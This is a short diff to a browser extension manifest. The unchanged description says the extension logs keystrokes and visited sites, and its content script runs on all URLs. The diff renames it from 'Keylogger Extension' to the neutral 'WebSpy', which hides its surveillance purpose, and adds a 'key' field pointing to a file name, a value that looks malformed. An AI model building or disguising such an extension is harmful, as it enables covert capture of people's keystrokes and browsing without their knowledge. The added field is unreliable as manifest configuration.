@@ -1,6 +1,6 @@
 {
   "manifest_version": 3,
-  "name": "Keylogger Extension",
+  "name": "WebSpy",
   "description": "This extension logs keystrokes and visited sites.",
   "version": "1.0",
   "background": {
@@ -14,5 +14,6 @@
       "matches": ["<all_urls>"],
       "js": ["content.js"]
     }
-  ]
+  ],
+  "key": "key.pem"
 }
